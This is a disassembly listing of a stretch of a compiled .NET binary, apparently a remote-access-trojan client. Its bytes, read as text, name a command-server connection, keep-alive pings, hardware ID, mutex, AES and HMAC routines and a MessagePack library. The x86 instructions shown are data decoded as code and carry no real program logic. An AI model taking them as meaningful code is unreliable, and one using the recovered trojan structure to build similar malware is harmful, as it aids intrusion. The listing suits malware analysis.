  40771e:	00 01                	add    %al,(%ecx)
  407720:	71 00                	jno    0x407722
  407722:	02 1c 01             	add    (%ecx,%eax,1),%bl
  407725:	00 00                	add    %al,(%eax)
  407727:	01 73 00             	add    %esi,0x0(%ebx)
  40772a:	ed                   	in     (%dx),%eax
  40772b:	1b 01                	sbb    (%ecx),%eax
  40772d:	00 00                	add    %al,(%eax)
  40772f:	01 75 00             	add    %esi,0x0(%ebp)
  407732:	e6 05                	out    %al,$0x5
  407734:	02 00                	add    (%eax),%al
  407736:	41                   	inc    %ecx
  407737:	01 77 00             	add    %esi,0x0(%edi)
  40773a:	03 1b                	add    (%ebx),%ebx
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 79 00             	add    %edi,0x0(%ecx)
  407742:	ba 08 02 00 40       	mov    $0x40000208,%edx
  407747:	01 7b 00             	add    %edi,0x0(%ebx)
  40774a:	79 0e                	jns    0x40775a
  40774c:	03 00                	add    (%eax),%eax
  40774e:	50                   	push   %eax
  40774f:	20 00                	and    %al,(%eax)
  407751:	00 2d 00 70 20 00    	add    %ch,0x207000
  407757:	00 47 00             	add    %al,0x0(%edi)
  40775a:	04 80                	add    $0x80,%al
  40775c:	00 00                	add    %al,(%eax)
  40775e:	01 00                	add    %eax,(%eax)
	...
  40776c:	c1 12 00             	rcll   $0x0,(%edx)
  40776f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40777a:	00 00                	add    %al,(%eax)
  40777c:	01 00                	add    %eax,(%eax)
  40777e:	b8 02 00 00 00       	mov    $0x2,%eax
  407783:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40778e:	00 00                	add    %al,(%eax)
  407790:	01 00                	add    %eax,(%eax)
  407792:	e9 0f 00 00 00       	jmp    0x4077a6
  407797:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077a2:	00 00                	add    %al,(%eax)
  4077a4:	cc                   	int3
  4077a5:	00 cf                	add    %cl,%bh
  4077a7:	0c 00                	or     $0x0,%al
  4077a9:	00 00                	add    %al,(%eax)
  4077ab:	00 04 00             	add    %al,(%eax,%eax,1)
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	00 00                	add    %al,(%eax)
  4077b2:	00 00                	add    %al,(%eax)
  4077b4:	70 00                	jo     0x4077b6
  4077b6:	00 00                	add    %al,(%eax)
  4077b8:	01 00                	add    %eax,(%eax)
  4077ba:	42                   	inc    %edx
  4077bb:	08 00                	or     %al,(%eax)
  4077bd:	00 00                	add    %al,(%eax)
  4077bf:	00 0a                	add    %cl,(%edx)
	...
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 cc                	add    %cl,%ah
  4077cd:	00 dc                	add    %bl,%ah
  4077cf:	02 00                	add    (%eax),%al
  4077d1:	00 00                	add    %al,(%eax)
  4077d3:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	cc                   	int3
  4077e1:	00 81 1a 00 00 00    	add    %al,0x1a(%ecx)
  4077e7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	01 00                	add    %eax,(%eax)
  4077f6:	a8 17                	test   $0x17,%al
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	04 00                	add    $0x0,%al
  4077fe:	00 00                	add    %al,(%eax)
  407800:	00 00                	add    %al,(%eax)
  407802:	00 00                	add    %al,(%eax)
  407804:	70 00                	jo     0x407806
  407806:	00 00                	add    %al,(%eax)
  407808:	cc                   	int3
  407809:	00 90 12 00 00 00    	add    %dl,0x12(%eax)
  40780f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407812:	0b 00                	or     (%eax),%eax
  407814:	10 00                	adc    %al,(%eax)
  407816:	0f 00 14 00          	lldt   (%eax,%eax,1)
  40781a:	13 00                	adc    (%eax),%eax
  40781c:	1e                   	push   %ds
  40781d:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  407823:	06                   	push   %es
  407824:	00 41 63             	add    %al,0x63(%ecx)
  407827:	74 69                	je     0x407892
  407829:	6f                   	outsl  %ds:(%esi),(%dx)
  40782a:	6e                   	outsb  %ds:(%esi),(%dx)
  40782b:	60                   	pusha
  40782c:	31 30                	xor    %esi,(%eax)
  40782e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407831:	70 5f                	jo     0x407892
  407833:	5f                   	pop    %edi
  407834:	30 00                	xor    %al,(%eax)
  407836:	49                   	dec    %ecx
  407837:	45                   	inc    %ebp
  407838:	6e                   	outsb  %ds:(%esi),(%dx)
  407839:	75 6d                	jne    0x4078a8
  40783b:	65 72 61             	gs jb  0x40789f
  40783e:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407842:	31 00                	xor    %eax,(%eax)
  407844:	43                   	inc    %ebx
  407845:	61                   	popa
  407846:	6c                   	insb   (%dx),%es:(%edi)
  407847:	6c                   	insb   (%dx),%es:(%edi)
  407848:	53                   	push   %ebx
  407849:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407850:	69 
  407851:	73 74                	jae    0x4078c7
  407853:	60                   	pusha
  407854:	31 00                	xor    %eax,(%eax)
  407856:	61                   	popa
  407857:	31 00                	xor    %eax,(%eax)
  407859:	76 31                	jbe    0x40788c
  40785b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40785e:	53                   	push   %ebx
  40785f:	74 61                	je     0x4078c2
  407861:	74 69                	je     0x4078cc
  407863:	63 41 72             	arpl   %eax,0x72(%ecx)
  407866:	72 61                	jb     0x4078c9
  407868:	79 49                	jns    0x4078b3
  40786a:	6e                   	outsb  %ds:(%esi),(%dx)
  40786b:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407872:	69 
  407873:	7a 65                	jp     0x4078da
  407875:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  40787a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407881:	74 2e                	je     0x4078b1
  407883:	57                   	push   %edi
  407884:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40788b:	55                   	push   %ebp
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	54                   	push   %esp
  407893:	6f                   	outsl  %ds:(%esi),(%dx)
  407894:	49                   	dec    %ecx
  407895:	6e                   	outsb  %ds:(%esi),(%dx)
  407896:	74 33                	je     0x4078cb
  407898:	32 00                	xor    (%eax),%al
  40789a:	53                   	push   %ebx
  40789b:	77 61                	ja     0x4078fe
  40789d:	70 49                	jo     0x4078e8
  40789f:	6e                   	outsb  %ds:(%esi),(%dx)
  4078a0:	74 33                	je     0x4078d5
  4078a2:	32 00                	xor    (%eax),%al
  4078a4:	3c 3e                	cmp    $0x3e,%al
  4078a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a7:	5f                   	pop    %edi
  4078a8:	5f                   	pop    %edi
  4078a9:	32 00                	xor    (%eax),%al
  4078ab:	61                   	popa
  4078ac:	32 00                	xor    (%eax),%al
  4078ae:	58                   	pop    %eax
  4078af:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078b4:	72 74                	jb     0x40792a
  4078b6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078bd:	32 00                	xor    (%eax),%al
  4078bf:	76 32                	jbe    0x4078f3
  4078c1:	00 76 33             	add    %dh,0x33(%esi)
  4078c4:	00 57 72             	add    %dl,0x72(%edi)
  4078c7:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078ce:	36 
  4078cf:	34 00                	xor    $0x0,%al
  4078d1:	54                   	push   %esp
  4078d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4078d3:	55                   	push   %ebp
  4078d4:	49                   	dec    %ecx
  4078d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d6:	74 36                	je     0x40790e
  4078d8:	34 00                	xor    $0x0,%al
  4078da:	47                   	inc    %edi
  4078db:	65 74 41             	gs je  0x40791f
  4078de:	73 55                	jae    0x407935
  4078e0:	49                   	dec    %ecx
  4078e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e2:	74 36                	je     0x40791a
  4078e4:	34 00                	xor    $0x0,%al
  4078e6:	53                   	push   %ebx
  4078e7:	65 74 41             	gs je  0x40792b
  4078ea:	73 55                	jae    0x407941
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	54                   	push   %esp
  4078f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f4:	49                   	dec    %ecx
  4078f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f6:	74 36                	je     0x40792e
  4078f8:	34 00                	xor    $0x0,%al
  4078fa:	53                   	push   %ebx
  4078fb:	77 61                	ja     0x40795e
  4078fd:	70 49                	jo     0x407948
  4078ff:	6e                   	outsb  %ds:(%esi),(%dx)
  407900:	74 36                	je     0x407938
  407902:	34 00                	xor    $0x0,%al
  407904:	54                   	push   %esp
  407905:	6f                   	outsl  %ds:(%esi),(%dx)
  407906:	55                   	push   %ebp
  407907:	49                   	dec    %ecx
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407910:	6e                   	outsb  %ds:(%esi),(%dx)
  407911:	74 31                	je     0x407944
  407913:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  407917:	61                   	popa
  407918:	70 49                	jo     0x407963
  40791a:	6e                   	outsb  %ds:(%esi),(%dx)
  40791b:	74 31                	je     0x40794e
  40791d:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407921:	41                   	inc    %ecx
  407922:	43                   	inc    %ebx
  407923:	53                   	push   %ebx
  407924:	48                   	dec    %eax
  407925:	41                   	inc    %ecx
  407926:	32 35 36 00 53 68    	xor    0x68530036,%dh
  40792c:	61                   	popa
  40792d:	32 35 36 00 41 65    	xor    0x65410036,%dh
  407933:	73 32                	jae    0x407967
  407935:	35 36 00 61 65       	xor    $0x65610036,%eax
  40793a:	73 32                	jae    0x40796e
  40793c:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407941:	53                   	push   %ebx
  407942:	74 61                	je     0x4079a5
  407944:	74 69                	je     0x4079af
  407946:	63 41 72             	arpl   %eax,0x72(%ecx)
  407949:	72 61                	jb     0x4079ac
  40794b:	79 49                	jns    0x407996
  40794d:	6e                   	outsb  %ds:(%esi),(%dx)
  40794e:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407955:	69 
  407956:	7a 65                	jp     0x4079bd
  407958:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  40795d:	74 5f                	je     0x4079be
  40795f:	55                   	push   %ebp
  407960:	54                   	push   %esp
  407961:	46                   	inc    %esi
  407962:	38 00                	cmp    %al,(%eax)
  407964:	3c 4d                	cmp    $0x4d,%al
  407966:	6f                   	outsl  %ds:(%esi),(%dx)
  407967:	64 75 6c             	fs jne 0x4079d6
  40796a:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  40796f:	73 73                	jae    0x4079e4
  407971:	61                   	popa
  407972:	67 65 50             	addr16 gs push %eax
  407975:	61                   	popa
  407976:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407979:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407980:	76 61                	jbe    0x4079e3
  407982:	74 65                	je     0x4079e9
  407984:	49                   	dec    %ecx
  407985:	6d                   	insl   (%dx),%es:(%edi)
  407986:	70 6c                	jo     0x4079f4
  407988:	65 6d                	gs insl (%dx),%es:(%edi)
  40798a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40798c:	74 61                	je     0x4079ef
  40798e:	74 69                	je     0x4079f9
  407990:	6f                   	outsl  %ds:(%esi),(%dx)
  407991:	6e                   	outsb  %ds:(%esi),(%dx)
  407992:	44                   	inc    %esp
  407993:	65 74 61             	gs je  0x4079f7
  407996:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40799d:	42 
  40799e:	32 41 31             	xor    0x31(%ecx),%al
  4079a1:	46                   	inc    %esi
  4079a2:	39 39                	cmp    %edi,(%ecx)
  4079a4:	30 32                	xor    %dh,(%edx)
  4079a6:	42                   	inc    %edx
  4079a7:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079ad:	38 30                	cmp    %dh,(%eax)
  4079af:	45                   	inc    %ebp
  4079b0:	46                   	inc    %esi
  4079b1:	31 36                	xor    %esi,(%esi)
  4079b3:	39 32                	cmp    %esi,(%edx)
  4079b5:	43                   	inc    %ebx
  4079b6:	45                   	inc    %ebp
  4079b7:	39 39                	cmp    %edi,(%ecx)
  4079b9:	34 37                	xor    $0x37,%al
  4079bb:	41                   	inc    %ecx
  4079bc:	31 39                	xor    %edi,(%ecx)
  4079be:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079c2:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079c5:	44                   	inc    %esp
  4079c6:	38 46 35             	cmp    %al,0x35(%esi)
  4079c9:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079cd:	41                   	inc    %ecx
  4079ce:	37                   	aaa
  4079cf:	32 31                	xor    (%ecx),%dh
  4079d1:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079d7:	43                   	inc    %ebx
  4079d8:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079dd:	43                   	inc    %ebx
  4079de:	00 45 53             	add    %al,0x53(%ebp)
  4079e1:	5f                   	pop    %edi
  4079e2:	53                   	push   %ebx
  4079e3:	59                   	pop    %ecx
  4079e4:	53                   	push   %ebx
  4079e5:	54                   	push   %esp
  4079e6:	45                   	inc    %ebp
  4079e7:	4d                   	dec    %ebp
  4079e8:	5f                   	pop    %edi
  4079e9:	52                   	push   %edx
  4079ea:	45                   	inc    %ebp
  4079eb:	51                   	push   %ecx
  4079ec:	55                   	push   %ebp
  4079ed:	49                   	dec    %ecx
  4079ee:	52                   	push   %edx
  4079ef:	45                   	inc    %ebp
  4079f0:	44                   	inc    %esp
  4079f1:	00 45 53             	add    %al,0x53(%ebp)
  4079f4:	5f                   	pop    %edi
  4079f5:	44                   	inc    %esp
  4079f6:	49                   	dec    %ecx
  4079f7:	53                   	push   %ebx
  4079f8:	50                   	push   %eax
  4079f9:	4c                   	dec    %esp
  4079fa:	41                   	inc    %ecx
  4079fb:	59                   	pop    %ecx
  4079fc:	5f                   	pop    %edi
  4079fd:	52                   	push   %edx
  4079fe:	45                   	inc    %ebp
  4079ff:	51                   	push   %ecx
  407a00:	55                   	push   %ebp
  407a01:	49                   	dec    %ecx
  407a02:	52                   	push   %edx
  407a03:	45                   	inc    %ebp
  407a04:	44                   	inc    %esp
  407a05:	00 4d 61             	add    %cl,0x61(%ebp)
  407a08:	70 4e                	jo     0x407a58
  407a0a:	61                   	popa
  407a0b:	6d                   	insl   (%dx),%es:(%edi)
  407a0c:	65 54                	gs push %esp
  407a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a0f:	4f                   	dec    %edi
  407a10:	49                   	dec    %ecx
  407a11:	44                   	inc    %esp
  407a12:	00 48 57             	add    %cl,0x57(%eax)
  407a15:	49                   	dec    %ecx
  407a16:	44                   	inc    %esp
  407a17:	00 67 65             	add    %ah,0x65(%edi)
  407a1a:	74 5f                	je     0x407a7b
  407a1c:	46                   	inc    %esi
  407a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407a1e:	72 6d                	jb     0x407a8d
  407a20:	61                   	popa
  407a21:	74 49                	je     0x407a6c
  407a23:	44                   	inc    %esp
  407a24:	00 45 58             	add    %al,0x58(%ebp)
  407a27:	45                   	inc    %ebp
  407a28:	43                   	inc    %ebx
  407a29:	55                   	push   %ebp
  407a2a:	54                   	push   %esp
  407a2b:	49                   	dec    %ecx
  407a2c:	4f                   	dec    %edi
  407a2d:	4e                   	dec    %esi
  407a2e:	5f                   	pop    %edi
  407a2f:	53                   	push   %ebx
  407a30:	54                   	push   %esp
  407a31:	41                   	inc    %ecx
  407a32:	54                   	push   %esp
  407a33:	45                   	inc    %ebp
  407a34:	00 38                	add    %bh,(%eax)
  407a36:	37                   	aaa
  407a37:	36 33 39             	xor    %ss:(%ecx),%edi
  407a3a:	31 32                	xor    %esi,(%edx)
  407a3c:	36 45                	ss inc %ebp
  407a3e:	41                   	inc    %ecx
  407a3f:	37                   	aaa
  407a40:	37                   	aaa
  407a41:	42                   	inc    %edx
  407a42:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a48:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a4d:	37                   	aaa
  407a4e:	44                   	inc    %esp
  407a4f:	42                   	inc    %edx
  407a50:	41                   	inc    %ecx
  407a51:	36 37                	ss aaa
  407a53:	43                   	inc    %ebx
  407a54:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a59:	46                   	inc    %esi
  407a5a:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a5f:	39 38                	cmp    %edi,(%eax)
  407a61:	38 38                	cmp    %bh,(%eax)
  407a63:	45                   	inc    %ebp
  407a64:	44                   	inc    %esp
  407a65:	30 37                	xor    %dh,(%edi)
  407a67:	30 43 44             	xor    %al,0x44(%ebx)
  407a6a:	34 30                	xor    $0x30,%al
  407a6c:	45                   	inc    %ebp
  407a6d:	31 46 36             	xor    %eax,0x36(%esi)
  407a70:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a76:	67 65 74 5f          	addr16 gs je 0x407ad9
  407a7a:	41                   	inc    %ecx
  407a7b:	53                   	push   %ebx
  407a7c:	43                   	inc    %ebx
  407a7d:	49                   	dec    %ecx
  407a7e:	49                   	dec    %ecx
  407a7f:	00 53 79             	add    %dl,0x79(%ebx)
  407a82:	73 74                	jae    0x407af8
  407a84:	65 6d                	gs insl (%dx),%es:(%edi)
  407a86:	2e 49                	cs dec %ecx
  407a88:	4f                   	dec    %edi
  407a89:	00 49 73             	add    %cl,0x73(%ecx)
  407a8c:	58                   	pop    %eax
  407a8d:	50                   	push   %eax
  407a8e:	00 42 44             	add    %al,0x44(%edx)
  407a91:	4f                   	dec    %edi
  407a92:	53                   	push   %ebx
  407a93:	00 45 53             	add    %al,0x53(%ebp)
  407a96:	5f                   	pop    %edi
  407a97:	43                   	inc    %ebx
  407a98:	4f                   	dec    %edi
  407a99:	4e                   	dec    %esi
  407a9a:	54                   	push   %esp
  407a9b:	49                   	dec    %ecx
  407a9c:	4e                   	dec    %esi
  407a9d:	55                   	push   %ebp
  407a9e:	4f                   	dec    %edi
  407a9f:	55                   	push   %ebp
  407aa0:	53                   	push   %ebx
  407aa1:	00 67 65             	add    %ah,0x65(%edi)
  407aa4:	74 5f                	je     0x407b05
  407aa6:	49                   	dec    %ecx
  407aa7:	56                   	push   %esi
  407aa8:	00 73 65             	add    %dh,0x65(%ebx)
  407aab:	74 5f                	je     0x407b0c
  407aad:	49                   	dec    %ecx
  407aae:	56                   	push   %esi
  407aaf:	00 47 65             	add    %al,0x65(%edi)
  407ab2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ab3:	65 72 61             	gs jb  0x407b17
  407ab6:	74 65                	je     0x407b1d
  407ab8:	49                   	dec    %ecx
  407ab9:	56                   	push   %esi
  407aba:	00 4d 54             	add    %cl,0x54(%ebp)
  407abd:	58                   	pop    %eax
  407abe:	00 76 61             	add    %dh,0x61(%esi)
  407ac1:	6c                   	insb   (%dx),%es:(%edi)
  407ac2:	75 65                	jne    0x407b29
  407ac4:	5f                   	pop    %edi
  407ac5:	5f                   	pop    %edi
  407ac6:	00 52 65             	add    %dl,0x65(%edx)
  407ac9:	61                   	popa
  407aca:	64 53                	fs push %ebx
  407acc:	65 72 76             	gs jb  0x407b45
  407acf:	65 72 74             	gs jb  0x407b46
  407ad2:	44                   	inc    %esp
  407ad3:	61                   	popa
  407ad4:	74 61                	je     0x407b37
  407ad6:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407ada:	61                   	popa
  407adb:	00 6d 73             	add    %ch,0x73(%ebp)
  407ade:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ae1:	6c                   	insb   (%dx),%es:(%edi)
  407ae2:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407ae9:	65 6d                	gs insl (%dx),%es:(%edi)
  407aeb:	2e 43                	cs inc %ebx
  407aed:	6f                   	outsl  %ds:(%esi),(%dx)
  407aee:	6c                   	insb   (%dx),%es:(%edi)
  407aef:	6c                   	insb   (%dx),%es:(%edi)
  407af0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407af5:	6e                   	outsb  %ds:(%esi),(%dx)
  407af6:	73 2e                	jae    0x407b26
  407af8:	47                   	inc    %edi
  407af9:	65 6e                	outsb  %gs:(%esi),(%dx)
  407afb:	65 72 69             	gs jb  0x407b67
  407afe:	63 00                	arpl   %eax,(%eax)
  407b00:	4d                   	dec    %ebp
  407b01:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b08:	74 2e                	je     0x407b38
  407b0a:	56                   	push   %esi
  407b0b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b12:	73 69                	jae    0x407b7d
  407b14:	63 00                	arpl   %eax,(%eax)
  407b16:	67 65 74 5f          	addr16 gs je 0x407b79
  407b1a:	53                   	push   %ebx
  407b1b:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b1d:	64 53                	fs push %ebx
  407b1f:	79 6e                	jns    0x407b8f
  407b21:	63 00                	arpl   %eax,(%eax)
  407b23:	45                   	inc    %ebp
  407b24:	6e                   	outsb  %ds:(%esi),(%dx)
  407b25:	64 52                	fs push %edx
  407b27:	65 61                	gs popa
  407b29:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b2d:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b34:	00 
  407b35:	54                   	push   %esp
  407b36:	68 72 65 61 64       	push   $0x64616572
  407b3b:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b3f:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b43:	6e                   	outsb  %ds:(%esi),(%dx)
  407b44:	65 72 41             	gs jb  0x407b88
  407b47:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b4c:	41                   	inc    %ecx
  407b4d:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b53:	61                   	popa
  407b54:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b5a:	74 5f                	je     0x407bbb
  407b5c:	43                   	inc    %ebx
  407b5d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b5e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b5f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b60:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b65:	00 67 65             	add    %ah,0x65(%edi)
  407b68:	74 5f                	je     0x407bc9
  407b6a:	49                   	dec    %ecx
  407b6b:	73 43                	jae    0x407bb0
  407b6d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b6f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b70:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b75:	00 73 65             	add    %dh,0x65(%ebx)
  407b78:	74 5f                	je     0x407bd9
  407b7a:	49                   	dec    %ecx
  407b7b:	73 43                	jae    0x407bc0
  407b7d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b7e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b7f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b80:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b85:	00 52 65             	add    %dl,0x65(%edx)
  407b88:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b8b:	76 65                	jbe    0x407bf2
  407b8d:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b91:	74 5f                	je     0x407bf2
  407b93:	47                   	inc    %edi
  407b94:	75 69                	jne    0x407bff
  407b96:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b9a:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407ba1:	64 
  407ba2:	53                   	push   %ebx
  407ba3:	79 6e                	jns    0x407c13
  407ba5:	63 3e                	arpl   %edi,(%esi)
  407ba7:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407bab:	61                   	popa
  407bac:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407baf:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb0:	67 46                	addr16 inc %esi
  407bb2:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bb9:	73 43                	jae    0x407bfe
  407bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  407bbc:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbd:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbe:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bc3:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bc8:	61                   	popa
  407bc9:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bcc:	6e                   	outsb  %ds:(%esi),(%dx)
  407bcd:	67 46                	addr16 inc %esi
  407bcf:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bd6:	65 65 70 41          	gs gs jo 0x407c1b
  407bda:	6c                   	insb   (%dx),%es:(%edi)
  407bdb:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407be2:	42                   	inc    %edx
  407be3:	61                   	popa
  407be4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407be7:	6e                   	outsb  %ds:(%esi),(%dx)
  407be8:	67 46                	addr16 inc %esi
  407bea:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407bf1:	65 61                	gs popa
  407bf3:	64 65 72 53          	fs gs jb 0x407c4a
  407bf7:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407bfe:	42                   	inc    %edx
  407bff:	61                   	popa
  407c00:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c03:	6e                   	outsb  %ds:(%esi),(%dx)
  407c04:	67 46                	addr16 inc %esi
  407c06:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c0d:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c14:	42                   	inc    %edx
  407c15:	61                   	popa
  407c16:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c19:	6e                   	outsb  %ds:(%esi),(%dx)
  407c1a:	67 46                	addr16 inc %esi
  407c1c:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c23:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c27:	61                   	popa
  407c28:	74 65                	je     0x407c8f
  407c2a:	50                   	push   %eax
  407c2b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c2c:	6e                   	outsb  %ds:(%esi),(%dx)
  407c2d:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c33:	61                   	popa
  407c34:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c37:	6e                   	outsb  %ds:(%esi),(%dx)
  407c38:	67 46                	addr16 inc %esi
  407c3a:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c41:	6e                   	outsb  %ds:(%esi),(%dx)
  407c42:	74 65                	je     0x407ca9
  407c44:	72 76                	jb     0x407cbc
  407c46:	61                   	popa
  407c47:	6c                   	insb   (%dx),%es:(%edi)
  407c48:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c4d:	61                   	popa
  407c4e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c51:	6e                   	outsb  %ds:(%esi),(%dx)
  407c52:	67 46                	addr16 inc %esi
  407c54:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c5b:	75 66                	jne    0x407cc3
  407c5d:	66 65 72 3e          	data16 gs jb 0x407c9f
  407c61:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c65:	61                   	popa
  407c66:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c69:	6e                   	outsb  %ds:(%esi),(%dx)
  407c6a:	67 46                	addr16 inc %esi
  407c6c:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c73:	66 66 73 65          	data16 data16 jae 0x407cdc
  407c77:	74 3e                	je     0x407cb7
  407c79:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c7d:	61                   	popa
  407c7e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c81:	6e                   	outsb  %ds:(%esi),(%dx)
